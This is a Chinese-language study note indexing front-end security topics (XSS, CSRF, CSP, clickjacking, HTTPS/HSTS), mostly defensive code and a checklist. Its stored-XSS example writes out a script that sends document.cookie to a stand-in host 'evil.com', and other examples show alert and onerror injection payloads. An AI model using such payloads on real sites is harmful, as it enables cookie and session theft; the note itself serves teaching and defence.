---
title: 前端安全章节索引
tags: [index, 前端, 安全]
updated: "2026-06-19"
---

# 前端安全知识体系

## 📋 目录

- [[10-security/XSS|XSS]] — 跨站脚本攻击
- [[10-security/CSRF|CSRF]] — 跨站请求伪造
- [[10-security/CSP|CSP]] — 内容安全策略
- [[10-security/HTTPS|HTTPS]] — TLS/SSL、HSTS
- [[10-security/Clickjacking|点击劫持]] — Clickjacking

---

## XSS（跨站脚本攻击）

### 攻击原理

```
 attacker → 注入恶意脚本 → 用户访问页面 → 脚本执行 → 窃取 Cookie/Token
```

### 三种类型

#### 1. 存储型 XSS
```html
<!-- 攻击者提交恶意内容，服务器存储 -->
<!-- 评论输入: -->
<script>
  fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>
<!-- 服务器未转义直接存储，用户访问时执行 -->
```

#### 2. 反射型 XSS
```html
<!-- URL 参数中的脚本被反射回来 -->
<!-- https://example.com/search?q=<script>alert(1)</script> -->
<!-- 服务端未转义直接返回脚本内容 -->
```

#### 3. DOM 型 XSS
```javascript
// 前端直接读取 URL 参数并插入页面
const params = new URLSearchParams(location.search);
document.getElementById("result").innerHTML = params.get("q");
// ?q=<img src=x onerror=alert(1)> 触发
```

### 防护措施

```javascript
// 1. 转义 HTML
function escapeHtml(str) {
  const div = document.createElement("div");
  div.textContent = str;
  return div.innerHTML;
}

// 2. 使用 React/Vue 等框架的自动转义

// 3. CSP（见 CSP 笔记）

// 4. HttpOnly Cookie
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict

// 5. 输入验证
function validateInput(input) {
  const pattern = /^[a-zA-Z0-9]{1,20}$/;
  return pattern.test(input);
}
```

---

## CSRF（跨站请求伪造）

### 攻击原理

```
用户登录 A 网站 → 访问 B 网站 → B 网站自动发送恶意请求到 A 
→ A 认为请求来自用户 → 执行操作
```

### 防护措施

```html
<!-- 1. CSRF Token -->
<!-- 表单 -->
<form method="POST">
  <input type="hidden" name="csrf_token" value="abc123">
</form>

<!-- 2. SameSite Cookie -->
Set-Cookie: session=xxx; SameSite=Strict

<!-- 3. 验证 Origin/Referer -->
if (req.headers.origin !== "https://example.com") {
  reject();
}
```

### 对比

| 攻击 | 窃取什么 | 防护 |
|------|---------|------|
| XSS | 用户数据、权限 | 转义、CSP、HttpOnly |
| CSRF | 执行操作 | Token、SameSite、Origin |

---

## CSP（内容安全策略）

```html
<!-- HTTP 响应头 -->
Content-Security-Policy: 
  default-src 'self';  <!-- 默认只允许同源 -->
  script-src 'self' 'nonce-abc123' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';  <!-- 内联样式 -->
  img-src 'self' data: https:;  <!-- 图片：同源+data协议+https -->
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';  <!-- 禁止被嵌入 -->
  report-uri /csp-report;
```

### meta 标签（不支持 report-uri）

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-abc123'">
```

### nonce 指令

```html
<!-- 服务器生成随机 nonce -->
<script nonce="abc123">
  // 只有带正确 nonce 的脚本才执行
</script>
```

---

## 点击劫持（Clickjacking）

### 攻击原理

```
iframe 覆盖原页面 → 用户点击的是恶意按钮
```

### 防护

```html
<!-- 1. X-Frame-Options -->
X-Frame-Options: DENY  <!-- 完全禁止 -->
X-Frame-Options: SAMEORIGIN  <!-- 仅同源允许 -->

<!-- 2. CSP frame-ancestors -->
Content-Security-Policy: frame-ancestors 'none';

<!-- 3. JS 防护 -->
if (top !== window) {
  top.location = window.location;
}
```

---

## 传输安全

### HTTPS

- 加密传输（TLS 1.2/1.3）
- 防止中间人攻击
- 认证服务器身份

### HSTS

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### 证书安全

- 使用 Let's Encrypt（免费）
- 证书链完整
- 定期更新

---

## 安全检查清单

- [ ] 所有表单输入验证
- [ ] 输出转义
- [ ] HttpOnly + Secure Cookie
- [ ] SameSite Cookie
- [ ] CSP 配置
- [ ] X-Frame-Options
- [ ] HTTPS + HSTS
- [ ] CSRF Token
- [ ] 依赖定期更新

---

*Last updated: 2026-06-19*

*Related: [[00-Index|前端知识体系]]*